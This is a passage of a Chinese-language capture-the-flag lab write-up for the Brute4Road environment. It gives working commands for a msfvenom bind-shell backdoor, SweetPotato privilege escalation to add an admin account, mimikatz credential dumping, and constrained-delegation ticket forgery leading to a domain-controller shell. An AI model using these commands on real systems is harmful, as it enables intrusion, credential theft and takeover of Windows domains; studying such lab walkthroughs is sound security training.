+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sa ElGNkOiC</span><br></pre></td></tr></table></figure>
+
+<p>知道了账号密码后我们使用MDUT.jar工具来进行连接。</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607223936180.png" alt="image-20250607223936180" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607224045204.png" alt="image-20250607224045204" style="zoom:80%;" />
+
+<p>发现我们的权限是mssql用户的权限，那么接下来我们应该需要进行提权，我们尝试上线一下msf。</p>
+<p>生成一个正向后门，然后上传到目标</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607231249099.png" alt="image-20250607231249099" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lhost=172.22.2.16 lport=3232 -f exe -o shell_x64.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 172.22.2.16</span><br><span class="line">set lport 3232</span><br></pre></td></tr></table></figure>
+
+<p>先不要exploit，我们先执行后门</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250607231557028.png" alt="image-20250607231557028" style="zoom:80%;" />
+
+<p>发现3232端口开启后，在msf进行exploit，成功拿下shell</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608145021979.png" alt="image-20250608145021979" style="zoom:80%;" />
+
+<p>然后<code>getsystem</code>一下就可以直接去看flag了。</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608145859064.png" alt="image-20250608145859064" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0a549a7a-4495-48aa-83fa-9e4cf66c20e1&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>我们发现这个MSSQL主机开放了3389端口，也就是RDP端口。我们可以创建一个用户然后我们自己登录进去。</p>
+<p>但是这里我们使用<code>shell</code>命令的时候失败，不知道是什么情况。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Strict chain  ...  156.238.233.113:5001  ...  127.0.0.1:39387 &lt;--socket error or timeout!</span><br><span class="line">[-] Failed to spawn shell with thread impersonation. Retrying without it.</span><br><span class="line">[proxychains] Strict chain  ...  156.238.233.113:5001  ...  127.0.0.1:46387 &lt;--socket error or timeout!</span><br><span class="line">[-] Error while running command shell: Thread 0 - error rsock didn&#x27;t connect in 10 seconds - last child error: Errno::ECONNREFUSED - Connection refused - connect(2) for &quot;127.0.0.1&quot; port 46387</span><br><span class="line"></span><br><span class="line">Call stack:</span><br><span class="line">/usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/rex-socket-0.1.57/lib/rex/socket.rb:759:in `rescue in block in tcp_socket_pair&#x27;</span><br><span class="line">/usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/rex-socket-0.1.57/lib/rex/socket.rb:757:in `block in tcp_socket_pair&#x27;</span><br><span class="line">/usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/rex-socket-0.1.57/lib/rex/socket.rb:756:in `each&#x27;</span><br><span class="line">/usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/rex-socket-0.1.57/lib/rex/socket.rb:756:in `with_index&#x27;</span><br><span class="line">/usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/rex-socket-0.1.57/lib/rex/socket.rb:756:in `tcp_socket_pair&#x27;</span><br><span class="line">/usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/rex-core-0.1.32/lib/rex/io/stream_abstraction.rb:21:in `initialize_abstraction&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/post/meterpreter/channels/pools/stream_pool.rb:40:in `initialize&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:186:in `new&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:186:in `execute&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb:276:in `cmd_execute&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb:363:in `rescue in cmd_shell&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb:358:in `cmd_shell&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:582:in `run_command&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:531:in `block in run_single&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `each&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_single&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:160:in `block in run&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `block in with_history_manager_context&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/shell/history_manager.rb:37:in `with_context&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:306:in `with_history_manager_context&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:133:in `run&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:582:in `_interact&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1749:in `cmd_sessions&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:582:in `run_command&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:531:in `block in run_single&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `each&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_single&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:165:in `block in run&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `block in with_history_manager_context&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/shell/history_manager.rb:37:in `with_context&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:306:in `with_history_manager_context&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:133:in `run&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:54:in `start&#x27;</span><br><span class="line">/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start&#x27;</span><br><span class="line">/usr/bin/msfconsole:23:in `&lt;main&gt;&#x27;</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br></pre></td></tr></table></figure>
+
+<p>报错情况如上。</p>
+<p>调试了半天一直不行，尝试用MDUT.jar工具上传土豆家族来执行命令。</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608153740715.png" alt="image-20250608153740715" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/迅雷下载/SweetPotato1.exe -a &quot;net user meteorkai qwe123! /add&quot;</span><br><span class="line">C:/迅雷下载/SweetPotato1.exe -a &quot;net localgroup administrators meteorkai /add&quot;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令成功后尝试用RDP进行远程连接。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608154039777.png" alt="image-20250608154039777"></p>
+<p>输入<code>systeminfo</code>命令后发现处于域环境内，虽然我们新建的这个用户不处于域环境内</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608154411750.png" alt="image-20250608154411750" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -b &quot;DC=xiaorang,DC=lab&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p>但是我这里执行失败了，可能是因为meteorkai用户不在域环境内。</p>
+<p>有点事事不顺了。</p>
+<p>上传mimikatz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>可以翻到<code>MSSQLSERVER$</code>这个用户，MSSQLSERVER 配置了到域控的约束委派, 可以通过 S4U 伪造高权限 ST 拿下域控</p>
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608162250083.png" alt="image-20250608162250083" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b2f31890cd9d1c605cffe8b0f9cec6f2</span><br></pre></td></tr></table></figure>
+
+<p>我们先用<code>getST.py</code>工具生成一个票据，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608163849061.png" alt="image-20250608163849061"></p>
+<p>然后上传票据到MSSQL主机，用mimikatz将其导入到内存。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608163926923.png" alt="image-20250608163926923"></p>
+<p>导入成功后检测一下啊！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608164008731.png" alt="image-20250608164008731"></p>
+<p>成功了！！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608164147064.png" alt="image-20250608164147064"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608165408565.png" alt="image-20250608165408565"></p>
+<p>这里已经拿到flag了，但是我们为了能有更好的命令执行环境，我们可以采取以下步骤：</p>
+<p>然后改一下我们kali机的hosts文件并执行以下命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator@CIFS_DC.xiaorang.lab@XIAORANG.LAB.ccache</span><br><span class="line"></span><br><span class="line">python smbexec.py -no-pass -k DC.xiaorang.lab</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608165055072.png" alt="image-20250608165055072"></p>
+<p>注意这里要把<code>Administrator@CIFS_DC.xiaorang.lab@XIAORANG.LAB.ccache</code>票据文件放到<code>smbexec.py</code>同一目录下！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250608165308875.png" alt="image-20250608165308875"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b2634c9f-719e-414d-864d-83975c8ceed5&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About me</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">3.</span> <span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag4"><span class="toc-number">4.</span> <span class="toc-text">flag4</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&text=春秋云镜-Brute4Road wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&title=春秋云镜-Brute4Road wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&is_video=false&description=春秋云镜-Brute4Road wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜-Brute4Road wp&body=Check out this article: http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&title=春秋云镜-Brute4Road wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&title=春秋云镜-Brute4Road wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&title=春秋云镜-Brute4Road wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&title=春秋云镜-Brute4Road wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&name=春秋云镜-Brute4Road wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/06/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road-wp/&t=春秋云镜-Brute4Road wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        Meteor_Kai
+        <br>
+        <a href="https://www.dkdun.cn/" target="_blank">DK盾</a>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">Home</a></li><!--
+                --><!--
+                --><li><a href="/about/">About me</a></li><!--
+                --><!--
+                --><li><a href="/archives/">Writing</a></li><!--
+                --><!--
+                --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+                --><!--
+                --><li><a href="/search/">Search</a></li><!--
+                --><!--
+                --><li><a href="/categories/">categories</a></li><!--
+                --><!--
+                --><li><a href="/tags/">tags</a></li><!--
+                --><!--
+                --><li><a href="/links/">links</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
